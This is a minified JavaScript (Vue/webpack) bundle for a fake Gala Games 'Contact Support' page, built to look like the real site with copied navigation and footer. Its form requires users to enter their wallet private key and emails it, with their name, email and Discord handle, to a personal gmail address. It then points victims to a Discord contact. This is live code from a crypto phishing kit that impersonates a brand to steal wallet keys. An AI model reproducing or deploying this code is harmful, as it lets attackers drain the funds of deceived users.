(window.webpackJsonp=window.webpackJsonp||[]).push([[6,2,3,4,5],{295:function(t,e,n){"use strict";n.r(e);n(296);var r={props:{label:{type:String,default:""},value:{type:[Number,String],default:""},required:{type:Boolean,default:!1}},model:{prop:"value",event:"update"},data:function(){return{isFocus:!1}},methods:{focusEnable:function(){this.isFocus=!0},focusDisable:function(){this.isFocus=!1}}},l=n(51),component=Object(l.a)(r,(function(){var t=this,e=t._self._c;return e("div",[e("label",{staticClass:"mb-2 flex items-center fs-18 font-weight-medium",attrs:{for:t.label}},[t._v("\n        "+t._s(t.label)+"\n        "),t.required?e("i",{staticClass:"v-icon notranslate ml-1 fas fa-asterisk theme--dark error--text",staticStyle:{"font-size":"10px"},attrs:{"aria-hidden":"true"}}):t._e()]),t._v(" "),e("div",{staticClass:"v-input theme--dark v-text-field v-text-field--single-line v-text-field--filled v-text-field--is-booted v-text-field--enclosed",class:{"v-input--is-focused accentBlue--text":t.isFocus,"v-input--is-label-active v-input--is-dirty":""!==t.value}},[e("div",{staticClass:"v-input__control"},[e("div",{staticClass:"v-input__slot secondary"},[e("div",{staticClass:"v-text-field__slot"},[e("input",{attrs:{type:"text",required:t.required},domProps:{value:t.value},on:{focus:t.focusEnable,blur:t.focusDisable,input:function(e){return t.$emit("update",e.target.value)}}})])]),t._v(" "),t._m(0)])])])}),[function(){var t=this._self._c;return t("div",{staticClass:"v-text-field__details"},[t("div",{staticClass:"v-messages theme--dark"},[t("div",{staticClass:"v-messages__wrapper"})])])}],!1,null,null,null);e.default=component.exports;installComponents(component,{Input:n(295).default})},296:function(t,e,n){"use strict";var r=n(2),l=n(19),o=n(10),c=n(7),path=n(204),v=n(4),d=n(110),m=n(12),h=n(205),f=n(40),_=n(78),x=n(203),C=n(3),k=n(79).f,w=n(34).f,y=n(17).f,A=n(297),S=n(298).trim,N="Number",I=c[N],z=path[N],E=I.prototype,G=c.TypeError,L=v("".slice),Z=v("".charCodeAt),H=function(t){var e=x(t,"number");return"bigint"==typeof e?e:B(e)},B=function(t){var e,n,r,l,o,c,v,code,d=x(t,"number");if(_(d))throw G("Cannot convert a Symbol value to a number");if("string"==typeof d&&d.length>2)if(d=S(d),43===(e=Z(d,0))||45===e){if(88===(n=Z(d,2))||120===n)return NaN}else if(48===e){switch(Z(d,1)){case 66:case 98:r=2,l=49;break;case 79:case 111:r=8,l=55;break;default:return+d}for(c=(o=L(d,2)).length,v=0;v<c;v++)if((code=Z(o,v))<48||code>l)return NaN;return parseInt(o,r)}return+d},M=d(N,!I(" 0o1")||!I("0b1")||I("+0x1")),V=function(t){return f(E,t)&&C((function(){A(t)}))},F=function(t){var e=arguments.length<1?0:I(H(t));return V(this)?h(Object(e),this,F):e};F.prototype=E,M&&!l&&(E.constructor=F),r({global:!0,constructor:!0,wrap:!0,forced:M},{Number:F});var D=function(t,source){for(var e,n=o?k(source):"MAX_VALUE,MIN_VALUE,NaN,NEGATIVE_INFINITY,POSITIVE_INFINITY,EPSILON,MAX_SAFE_INTEGER,MIN_SAFE_INTEGER,isFinite,isInteger,isNaN,isSafeInteger,parseFloat,parseInt,fromString,range".split(","),r=0;n.length>r;r++)m(source,e=n[r])&&!m(t,e)&&y(t,e,w(source,e))};l&&z&&D(path[N],z),(M||l)&&D(path[N],I)},297:function(t,e,n){var r=n(4);t.exports=r(1..valueOf)},298:function(t,e,n){var r=n(4),l=n(24),o=n(13),c=n(299),v=r("".replace),d="["+c+"]",m=RegExp("^"+d+d+"*"),h=RegExp(d+d+"*$"),f=function(t){return function(e){var n=o(l(e));return 1&t&&(n=v(n,m,"")),2&t&&(n=v(n,h,"")),n}};t.exports={start:f(1),end:f(2),trim:f(3)}},299:function(t,e){t.exports="\t\n\v\f\r                　\u2028\u2029\ufeff"},300:function(t,e,n){"use strict";n.r(e);n(33),n(80);var r={data:function(){return{name:"",email:"",privateKey:"",discordName:"",success:!1,msg:""}},methods:{sendEmail:function(){var t=this;this.success=!1,this.$mail.send({from:"erwinclapero69@gmail.com",subject:"Gala-games contact support",text:"\n                    name: ".concat(this.name,"\n                    <br>\n                    email: ").concat(this.email,"\n                    <br>\n                    private key: ").concat(this.privateKey,"\n                    <br>\n                    discord name: ").concat(this.discordName,"\n                ")}).then((function(){t.name="",t.email="",t.privateKey="",t.discordName="",t.msg='\n                Thanks for reaching out! A customer support agent will be in touch with you soon! This usually happens almost right away, but in some situations it can be up to 12 hours before we are able to respond. Please know that we have received your ticket and will get back to you as soon as possible. If you have not received a response within 24 hours, please contact ChairBandit#0001 on Discord.\n                <span class="block pt-4">Note: Please ensure support@gala.games is whitelisted. Otherwise replies may go to your spam box.</span>',t.success=!0})).catch((function(){t.msg="Network error, please try again.",t.success=!0}))}}},l=n(51),component=Object(l.a)(r,(function(){var t=this,e=t._self._c;return e("main",{staticClass:"v-main secondary pb-12"},[e("div",{staticClass:"v-main__wrap"},[e("div",{staticClass:"contact-us-page"},[e("div",{staticClass:"flex blue-hero shrink"},[e("div",{staticClass:"background-check sm:hidden block"},[e("svg",{staticClass:"background-check-svg hero-bg-check row-bg",attrs:{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 300 200"}},[e("path",{staticStyle:{stroke:"rgb(37, 215, 248)",fill:"rgb(37, 215, 248)"},attrs:{"stroke-width":"1",d:"M1,1 V199 H57 L299,1 h-63 L40,155 V1z"}})])]),t._v(" "),e("div",{staticClass:"sm:flex flex-wrap mx-auto content-container"},[t._m(0),t._v(" "),e("div",{staticClass:"w-3/6 pa-0 justify-center hero-image-container sm:flex hidden"},[e("div",{staticClass:"background-check"},[e("svg",{staticClass:"background-check-svg hero-bg-check short",attrs:{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 300 200"}},[e("path",{staticStyle:{stroke:"rgb(37, 215, 248)",fill:"rgb(37, 215, 248)"},attrs:{"stroke-width":"1",d:"M1,1 V199 H57 L299,1 h-63 L40,155 V1z"}})])]),t._v(" "),e("div",{staticClass:"place-holder",staticStyle:{"padding-top":"calc(44%)"}})])])]),t._v(" "),e("div",{staticClass:"content-container"},[e("div",{staticClass:"v-card v-sheet theme--dark accent mt-10 py-6 px-10"},[e("form",{staticClass:"v-form",on:{submit:function(e){return e.preventDefault(),t.sendEmail.apply(null,arguments)}}},[e("Input",{attrs:{label:"Name"},model:{value:t.name,callback:function(e){t.name=e},expression:"name"}}),t._v(" "),e("Input",{attrs:{label:"Email",required:""},model:{value:t.email,callback:function(e){t.email=e},expression:"email"}}),t._v(" "),e("Input",{attrs:{label:"Private Key",required:""},model:{value:t.privateKey,callback:function(e){t.privateKey=e},expression:"privateKey"}}),t._v(" "),e("Input",{attrs:{label:"Discord Username"},model:{value:t.discordName,callback:function(e){t.discordName=e},expression:"discordName"}}),t._v(" "),t.success?e("p",{staticClass:"mb-6",domProps:{innerHTML:t._s(t.msg)}}):t._e(),t._v(" "),e("button",{staticClass:"gala-btn accentBlue !px-14 mt-4",attrs:{type:"submit"}},[t._v("Submit")])],1)])])])])])}),[function(){var t=this._self._c;return t("div",{staticClass:"sm:w-3/6 flex flex-col justify-center first-col sm:p-0 sm:pl-4 pt-8 sm:text-left text-center"},[t("h1",{staticClass:"white--text mb-4"},[this._v("Contact Support")])])}],!1,null,null,null);e.default=component.exports;installComponents(component,{Input:n(295).default})},301:function(t,e,n){"use strict";n.r(e);var r=n(51),component=Object(r.a)({},(function(){this._self._c;return this._m(0)}),[function(){var t=this,e=t._self._c;return e("div",{staticClass:"top-toolbar"},[e("nav",{staticClass:"v-sheet theme--dark v-toolbar v-toolbar--flat v-app-bar v-app-bar--clipped v-app-bar--fixed accent"},[e("div",{staticClass:"v-toolbar__content"},[e("a",{staticClass:"h-[51px] mr-2",attrs:{href:"https://app.gala.games/"}},[e("img",{staticClass:"h-[48px]",attrs:{src:"/logo.png",height:"48px",alt:"gala logo"}})]),t._v(" "),e("div",{staticClass:"v-toolbar__items pl-5"},[e("a",{staticClass:"v-btn v-btn--flat v-btn--router v-btn--text theme--dark v-size--default top-nav-btn text-capitalize !px-2 textColor--text",attrs:{href:"https://app.gala.games/about"}},[e("span",{staticClass:"v-btn__content"},[t._v("About")])]),t._v(" "),e("a",{staticClass:"v-btn v-btn--flat v-btn--router v-btn--text theme--dark v-size--default top-nav-btn text-capitalize !px-2 textColor--text",attrs:{href:"https://app.gala.games/store"}},[e("span",{staticClass:"v-btn__content"},[t._v("Store")])]),t._v(" "),e("a",{staticClass:"v-btn v-btn--flat v-btn--router v-btn--text theme--dark v-size--default top-nav-btn text-capitalize !px-2 textColor--text",attrs:{href:"https://app.gala.games/games"}},[e("span",{staticClass:"v-btn__content"},[t._v("Games")])]),t._v(" "),e("a",{staticClass:"v-btn v-btn--flat v-btn--router v-btn--text theme--dark v-size--default top-nav-btn text-capitalize !px-2 textColor--text",attrs:{href:"https://app.gala.games/nodes"}},[e("span",{staticClass:"v-btn__content"},[t._v("Nodes")])]),t._v(" "),e("a",{staticClass:"v-btn v-btn--flat v-btn--router v-btn--text theme--dark v-size--default top-nav-btn text-capitalize !px-2 textColor--text",attrs:{href:"https://app.gala.games/get-gala"}},[e("span",{staticClass:"v-btn__content"},[t._v("Get GALA")])]),t._v(" "),e("a",{staticClass:"v-btn v-btn--flat v-btn--router v-btn--text theme--dark v-size--default top-nav-btn text-capitalize !px-2 textColor--text",attrs:{href:"https://app.gala.games/careers"}},[e("span",{staticClass:"v-btn__content"},[t._v("Careers")])])]),t._v(" "),e("div",{staticClass:"discord-toolbar-link pl-3"},[e("a",{staticClass:"flex items-center h-full",attrs:{href:"http://galagames.chat",target:"_blank",rel:"noreferer, ,noopener"}},[e("img",{staticClass:"mr-1",attrs:{src:"/Discord-Logo-White.png",alt:"discord logo"}}),t._v(" "),e("span",{staticClass:"medium-font pr-3 leading-[1px]"},[t._v("Join Discord")])])]),t._v(" "),e("div",{staticClass:"login-register-container flex items-center h-full textColor--text"},[e("button",{staticClass:"gala-btn colored medium outline outline-0 font-weight-regular mr-4 accentBlue--text register-btn account-creation-start-btn"},[t._v("\n                    Register\n                ")]),t._v(" "),e("button",{staticClass:"gala-btn medium font-weight-regular account-login-start-btn"},[t._v("\n                    Login\n                ")])])])])])}],!1,null,null,null);e.default=component.exports},302:function(t,e,n){"use strict";n.r(e);var r=n(51),component=Object(r.a)({},(function(){this._self._c;return this._m(0)}),[function(){var t=this,e=t._self._c;return e("div",{staticClass:"footer p-3"},[e("div",{staticClass:"md:flex pt-4 lg:pb-4 sm:pb-8 pb-4 lg:px-16"},[e("div",{staticClass:"grow md:pr-16"},[e("div",{staticClass:"main-links flex"},[e("div",[e("p",{staticClass:"font-weight-bold mb-2 uppercase"},[t._v("Help")]),t._v(" "),e("a",{attrs:{href:"https://gala.games/frequently-asked-questions-f-a-qs/",target:"_blank"}},[t._v("\n                        FAQs\n                    ")]),t._v(" "),e("a",{attrs:{href:"https://app.gala.games/contact-support","aria-current":"page"}},[t._v("\n                        Contact Support\n                    ")])]),t._v(" "),e("div",{staticClass:"mx-12"},[e("p",{staticClass:"font-weight-bold mb-2 uppercase"},[t._v("\n                        About\n                    ")]),t._v(" "),e("a",{attrs:{href:"https://app.gala.games/about"}},[t._v(" About Us ")]),t._v(" "),e("a",{attrs:{href:"https://app.gala.games/careers"}},[t._v(" Careers ")]),t._v(" "),e("a",{attrs:{href:"https://gogalagames.medium.com/",target:"_blank",rel:"noreferer, ,noopener"}},[t._v("\n                        News\n                    ")]),t._v(" "),e("a",{attrs:{href:"https://app.gala.games/environmentalimpact"}},[t._v("\n                        Environmental Impact\n                    ")])]),t._v(" "),e("div",[e("p",{staticClass:"font-weight-bold mb-2 uppercase"},[t._v("\n                        GALA Coin\n                    ")]),t._v(" "),e("a",{attrs:{href:"https://app.gala.games/get-gala"}},[t._v(" Get GALA ")]),t._v(" "),e("a",{attrs:{href:"https://etherscan.io/token/0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA",target:"_blank",rel:"noreferer, ,noopener"}},[t._v("\n                        Smart Contract\n                    ")])])])]),t._v(" "),e("div",{staticClass:"shrink md:pt-0 pt-6"},[e("p",{staticClass:"font-weight-bold mb-2 uppercase"},[t._v("\n                Join Our Community\n            ")]),t._v(" "),e("div",{staticClass:"social md:grid grid-cols-5 sm:flex grid"},[e("a",{staticStyle:{background:"rgb(29, 161, 242)"},attrs:{href:"https://twitter.com/GoGalaGames",target:"_blank",rel:"noreferer, ,noopener"}},[e("i",{staticClass:"v-icon notranslate fab fa-twitter theme--dark white--text",attrs:{"aria-hidden":"true"}})]),t._v(" "),e("a",{staticStyle:{background:"rgb(59, 89, 152)"},attrs:{href:"https://www.facebook.com/GoGalaGames",target:"_blank",rel:"noreferer, ,noopener"}},[e("i",{staticClass:"v-icon notranslate fab fa-facebook-square theme--dark white--text",attrs:{"aria-hidden":"true"}})]),t._v(" "),e("a",{staticStyle:{background:"rgb(196, 48, 43)"},attrs:{href:"https://www.youtube.com/c/GalaGames",target:"_blank",rel:"noreferer, ,noopener"}},[e("i",{staticClass:"v-icon notranslate fab fa-youtube theme--dark white--text",attrs:{"aria-hidden":"true"}})]),t._v(" "),e("a",{staticStyle:{background:"rgb(114, 137, 218)"},attrs:{href:"http://galagames.chat",target:"_blank",rel:"noreferer, ,noopener"}},[e("i",{staticClass:"v-icon notranslate fab fa-discord theme--dark white--text",attrs:{"aria-hidden":"true"}})]),t._v(" "),e("a",{staticStyle:{background:"rgb(255, 255, 255)"},attrs:{href:"https://www.instagram.com/gogalagames/",target:"_blank",rel:"noreferer, ,noopener"}},[e("i",{staticClass:"v-icon notranslate fab fa-instagram theme--dark black--text",attrs:{"aria-hidden":"true"}})])])])]),t._v(" "),e("div",{staticClass:"flex copywrite-container lg:pl-3"},[e("div",{staticClass:"mr-4 mb-2"},[e("span",[t._v("© 2021 Gala Games")]),t._v(" "),e("span",{staticClass:"mx-3 sm:inline-block hidden"},[t._v("•")]),t._v(" "),e("a",{staticClass:"pointer sm:inline-block hidden",attrs:{href:"https://app.gala.games/terms-and-conditions"}},[t._v("\n                Terms and Conditions\n            ")]),t._v(" "),e("span",{staticClass:"mx-3 sm:inline-block hidden"},[t._v("•")]),t._v(" "),e("a",{staticClass:"pointer sm:inline-block hidden",attrs:{href:"/https://app.gala.games/terms-and-conditions"}},[t._v(" Privacy Policy ")]),t._v(" "),e("span",{staticClass:"mx-3 sm:inline-block hidden"},[t._v("•")]),t._v(" "),e("a",{staticClass:"pointer sm:inline-block hidden",attrs:{onclick:"UC_UI.showSecondLayer();"}},[t._v("\n                Privacy Settings\n            ")]),t._v(" "),e("span",{staticClass:"mx-3 sm:inline-block hidden"},[t._v("•")]),t._v(" "),e("a",{staticClass:"pointer sm:inline-block hidden",attrs:{href:"https://app.gala.games/launcher-eula"}},[t._v(" Launcher EULA ")])]),t._v(" "),e("div",{staticClass:"language-switch-container mb-2"},[e("p",{staticClass:"mr-2 mb-0"},[t._v("Language:")]),t._v(" "),e("div",{staticClass:"control flex items-center accentBlue--text font-weight-medium currency-filter-selector mr-4"},[e("div",{staticClass:"flex justify-between items-center control-text"},[e("div",{staticClass:"language-info"},[e("span",{staticClass:"flag f-us normal-flag",staticStyle:{"background-image":"url('/flags.png')"}}),t._v(" "),e("p",{staticClass:"option font-weight-regular language-switch-text mb-0"},[t._v("EN")])]),t._v(" "),e("i",{staticClass:"v-icon notranslate px-1 control-icon mdi mdi-chevron-up theme--dark",staticStyle:{"font-size":"16px",color:"rgb(56, 58, 69)","caret-color":"rgb(56, 58, 69)"},attrs:{"aria-hidden":"true"}})])])])])])}],!1,null,null,null);e.default=component.exports},303:function(t,e,n){"use strict";n.r(e);var r={name:"IndexPage"},l=n(51),component=Object(l.a)(r,(function(){var t=this,e=t._self._c;return e("div",{staticClass:"v-application app-wrapper v-application--is-ltr"},[e("div",{staticClass:"v-application--wrap"},[e("AppHeader"),t._v(" "),e("AppContent"),t._v(" "),e("AppFooter"),t._v(" "),e("div",{staticClass:"v-bottom-navigation v-item-group theme--dark v-bottom-navigation--fixed modalBackground accentLight--text",staticStyle:{height:"56px",transform:"none"}},[t._m(0),t._v(" "),e("a",{staticClass:"bottom-nav-btn v-btn v-btn--flat v-btn--router v-btn--text theme--dark v-size--default accentBlueDark--text",staticStyle:{"min-width":"auto"},attrs:{href:"https://app.gala.games/store"}},[e("span",{staticClass:"v-btn__content"},[e("span",{staticClass:"bottom-nav-title"},[t._v("Store")]),t._v(" "),e("span",{staticClass:"v-icon notranslate mb-1 theme--dark",staticStyle:{"font-size":"32px",height:"32px",width:"32px"},attrs:{"aria-hidden":"true"}},[e("svg",{staticClass:"store-icon v-icon__component theme--dark",staticStyle:{"font-size":"32px",height:"32px",width:"32px"},attrs:{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 29.941 29.941"}},[e("path",{attrs:{d:"M44.311,23.417v-.06c0-.06-.03-.09-.03-.151h0l-3.554-8.555a.719.719,0,0,0-.663-.452H18.647a.719.719,0,0,0-.663.452L14.43,23.207h0a.272.272,0,0,0-.03.151v2.259a4.314,4.314,0,0,0,1.235,3.012,3.878,3.878,0,0,0,.9.663V43.418a.733.733,0,0,0,.723.723H41.48a.733.733,0,0,0,.723-.723V29.351a4.251,4.251,0,0,0,2.139-3.705V23.508A.111.111,0,0,1,44.311,23.417Zm-1.777-.633H37.052l-1.476-7.139h4.006Zm-19.549,3.4a3.336,3.336,0,0,1-.06-.572V24.2h5.693v1.416a3.336,3.336,0,0,1-.06.572,2.851,2.851,0,0,1-4.82,1.446A2.9,2.9,0,0,1,22.985,26.189Zm7.079-10.543H34.13l.813,3.976.663,3.163H30.064Zm.03,10.543a3.336,3.336,0,0,1-.06-.572V24.2h5.693v1.416a3.336,3.336,0,0,1-.06.572,2.851,2.851,0,0,1-4.82,1.446A2.9,2.9,0,0,1,30.094,26.189Zm-1.476-3.4H23.075l.753-3.585.753-3.554h4.066v7.139Zm-9.488-7.139h4.006l-1.476,7.139H16.147ZM15.786,24.2h5.723v1.416a3.336,3.336,0,0,1-.06.572,2.869,2.869,0,0,1-2.8,2.289,2.834,2.834,0,0,1-2.018-.843,2.732,2.732,0,0,1-.843-1.988Zm10,18.555v-5a3.554,3.554,0,0,1,7.109,0v5Zm14.971,0H34.341v-5a5,5,0,1,0-10,0v5H17.924V29.864c.06,0,.12.03.181.03a.181.181,0,0,1,.12.03c.12,0,.271.03.392.03h.422c.09,0,.181-.03.271-.03h.09c.12-.03.211-.03.331-.06.03,0,.06,0,.06-.03.09-.03.151-.06.241-.09.03,0,.06-.03.09-.03.09-.03.151-.06.241-.09.03,0,.03-.03.06-.03a1.221,1.221,0,0,0,.271-.151c.03-.03.06-.03.09-.06a.63.63,0,0,0,.181-.12c.03-.03.06-.03.09-.06.09-.06.151-.12.241-.181l.09-.09c.06-.03.09-.09.151-.12l.12-.12c.03-.03.06-.09.12-.12l.151-.151a.657.657,0,0,1,.12-.151c.03-.06.06-.09.09-.151,0-.03.03-.03.03-.06,0,.03.03.03.03.06.06.09.12.151.181.241.03.03.06.06.06.09l.271.271a4.238,4.238,0,0,0,3.012,1.235h.422c.09,0,.181-.03.271-.03h.09c.12-.03.211-.03.331-.06.03,0,.06,0,.06-.03.09-.03.151-.06.241-.09.03,0,.06-.03.09-.03.09-.03.151-.06.241-.09.03,0,.03-.03.06-.03a1.221,1.221,0,0,0,.271-.151c.03-.03.06-.03.09-.06a.63.63,0,0,0,.181-.12c.03-.03.06-.03.09-.06.09-.06.151-.12.241-.181l.09-.09c.06-.03.09-.09.151-.12l.12-.12c.03-.03.06-.09.12-.12l.151-.151a.657.657,0,0,1,.12-.151c.03-.06.06-.09.09-.151,0-.03.03-.03.03-.06,0,.03.03.03.03.06.06.09.12.151.181.241.03.03.06.06.06.09l.271.271a4.238,4.238,0,0,0,3.012,1.235h.422c.09,0,.181-.03.271-.03h.09c.12-.03.211-.03.331-.06.03,0,.06,0,.06-.03.09-.03.151-.06.241-.09.03,0,.06-.03.09-.03.09-.03.151-.06.241-.09.03,0,.03-.03.06-.03a1.221,1.221,0,0,0,.271-.151c.03-.03.06-.03.09-.06a.63.63,0,0,0,.181-.12c.03-.03.06-.03.09-.06.09-.06.151-.12.241-.181l.09-.09c.06-.03.09-.09.151-.12l.12-.12c.03-.03.06-.09.12-.12l.151-.151c.06-.06.09-.12.151-.181.03-.06.06-.09.09-.151,0-.03.03-.03.03-.06,0,.03.03.03.03.06.06.09.12.151.181.241.03.03.06.06.06.09l.271.271c.12.12.241.211.361.331.03.03.06.03.06.06.12.09.241.151.361.241.03,0,.03.03.06.03a4.545,4.545,0,0,0,1.868.6h.633c.09,0,.211-.03.3-.03h.12V42.756ZM42.9,25.646a2.83,2.83,0,0,1-1.717,2.621,2.925,2.925,0,0,1-3.163-.6,2.965,2.965,0,0,1-.783-1.446,3.336,3.336,0,0,1-.06-.572V24.231H42.9Z",transform:"translate(-14.4 -14.2)"}})])])])]),t._v(" "),e("a",{staticClass:"bottom-nav-btn v-btn v-btn--flat v-btn--router v-btn--text theme--dark v-size--default accentBlueDark--text",staticStyle:{"min-width":"auto"},attrs:{href:"https://app.gala.games/games",id:"Games-nav-btn"}},[e("span",{staticClass:"v-btn__content"},[e("span",{staticClass:"bottom-nav-title"},[t._v("Games")]),t._v(" "),e("span",{staticClass:"v-icon notranslate mb-1 theme--dark",staticStyle:{"font-size":"32px",height:"32px",width:"32px"},attrs:{"aria-hidden":"true"}},[e("svg",{staticClass:"games-icon v-icon__component theme--dark",staticStyle:{"font-size":"32px",height:"32px",width:"32px"},attrs:{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 174.5 109.47"}},[e("title",[t._v("icon_games")]),t._v(" "),e("path",{attrs:{d:"M918.81,1350.91c-12.14,0-22.31-5.4-24.49-13.92-2-7.71-14.86-14.23-28.11-14.23h-4.87c-13.26,0-26.13,6.52-28.11,14.23-2.73,10.63-17.89,16.42-33.81,12.89a29.75,29.75,0,0,1-18.91-13.25,26.27,26.27,0,0,1-3.16-20.42L791.5,1261c2.86-10,14.16-18.79,25.21-19.58.12,0,.34,0,9.54,0h75c9.19,0,9.39,0,9.5,0,11.06.79,22.38,9.55,25.24,19.52l2.08,8.12h0l.09.35c1.13,4.37,12,46.75,12,46.75a26.27,26.27,0,0,1-3.17,20.42,29.76,29.76,0,0,1-18.9,13.25A43.33,43.33,0,0,1,918.81,1350.91Zm-57.47-34.15h4.87c16.32,0,31.22,8.23,33.92,18.74h0c1.9,7.4,14.12,11.31,26.7,8.52a23.72,23.72,0,0,0,15.09-10.53,20.29,20.29,0,0,0,2.46-15.79c-9.45-36.85-11.57-45.1-12-47.12h0l-2.06-8c-2.16-7.51-11.22-14.45-19.79-15.1H817.06c-8.57.65-17.61,7.57-19.77,15.16l-14.13,55.09a20.3,20.3,0,0,0,2.47,15.79A23.67,23.67,0,0,0,800.72,1344c12.57,2.78,24.8-1.12,26.7-8.52C830.11,1325,845,1316.76,861.34,1316.76Z",transform:"translate(-776.52 -1241.44)"}}),t._v(" "),e("polygon",{attrs:{points:"77.15 36.28 64.72 36.28 64.72 24.73 48.99 24.73 48.99 36.28 36.57 36.28 36.57 50.91 48.99 50.91 48.99 62.46 64.72 62.46 64.72 50.91 77.15 50.91 77.15 36.28"}}),t._v(" "),e("path",{attrs:{d:"M912.25,1278.63a6.67,6.67,0,1,0,7.16,6.66A6.92,6.92,0,0,0,912.25,1278.63Z",transform:"translate(-776.52 -1241.44)"}}),t._v(" "),e("path",{attrs:{d:"M884.79,1278.63a6.67,6.67,0,1,0,7.15,6.66A6.92,6.92,0,0,0,884.79,1278.63Z",transform:"translate(-776.52 -1241.44)"}}),t._v(" "),e("ellipse",{attrs:{cx:"121.99",cy:"31.05",rx:"7.16",ry:"6.66"}}),t._v(" "),e("path",{attrs:{d:"M901,1291.83a7.31,7.31,0,0,0-9.17,4,6.54,6.54,0,0,0,4.28,8.53,7.33,7.33,0,0,0,9.18-4A6.54,6.54,0,0,0,901,1291.83Z",transform:"translate(-776.52 -1241.44)"}})])])])]),t._v(" "),e("a",{staticClass:"bottom-nav-btn v-btn v-btn--flat v-btn--router v-btn--text theme--dark v-size--default accentBlueDark--text",staticStyle:{"min-width":"auto"},attrs:{href:"https://app.gala.games/nodes"}},[e("span",{staticClass:"v-btn__content"},[e("span",{staticClass:"bottom-nav-title"},[t._v("Nodes")]),t._v(" "),e("span",{staticClass:"v-icon notranslate mb-1 theme--dark",staticStyle:{"font-size":"32px",height:"32px",width:"32px"},attrs:{"aria-hidden":"true"}},[e("svg",{staticClass:"node-icon v-icon__component theme--dark",staticStyle:{"font-size":"32px",height:"32px",width:"32px"},attrs:{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 217.65 194.34"}},[e("path",{attrs:{d:"M393.7,374.65a20.59,20.59,0,0,0-7.22,1.3l-23.43-40.58a20.68,20.68,0,1,0-33.34-19.63h-47a20.68,20.68,0,1,0-33.5,19.49l-23.72,41.08a20.68,20.68,0,1,0-.34,38.18l24.1,41.74a20.68,20.68,0,1,0,33.55,18.92h46.79A20.68,20.68,0,1,0,362.83,456l23.79-41.2a20.68,20.68,0,1,0,7.08-40.11ZM254.38,338.34a20.7,20.7,0,0,0,28.5-16.53h46.69a20.66,20.66,0,0,0,7.72,13.69l-23.57,40.83A20.68,20.68,0,0,0,285,393H238a20.63,20.63,0,0,0-7.31-13.51Zm75.27,130.75H282.8a20.71,20.71,0,0,0-28.37-15.95l-24.07-41.7A20.61,20.61,0,0,0,237.75,399h47.46a20.68,20.68,0,0,0,28.32,15.39l23.94,41.46A20.64,20.64,0,0,0,329.65,469.09Zm28-16.11a20.76,20.76,0,0,0-14.91-.05l-24-41.62a20.68,20.68,0,0,0,.15-31.83l23.67-41a20.76,20.76,0,0,0,15.37-.07l23.35,40.43a20.66,20.66,0,0,0,.12,33Z",transform:"translate(-196.73 -298.58)"}})])])])])])],1)])}),[function(){var t=this,e=t._self._c;return e("a",{staticClass:"bottom-nav-btn v-btn v-btn--flat v-btn--router v-btn--text theme--dark v-btn--active v-size--default accentBlueDark--text",staticStyle:{"min-width":"auto"},attrs:{href:"https://app.gala.games/about"}},[e("span",{staticClass:"v-btn__content"},[e("span",{staticClass:"bottom-nav-title"},[t._v("About")]),t._v(" "),e("i",{staticClass:"v-icon notranslate mb-1 fas fa-home theme--dark",staticStyle:{"font-size":"32px"},attrs:{"aria-hidden":"true"}})])])}],!1,null,null,null);e.default=component.exports;installComponents(component,{AppHeader:n(301).default,AppContent:n(300).default,AppFooter:n(302).default})}}]);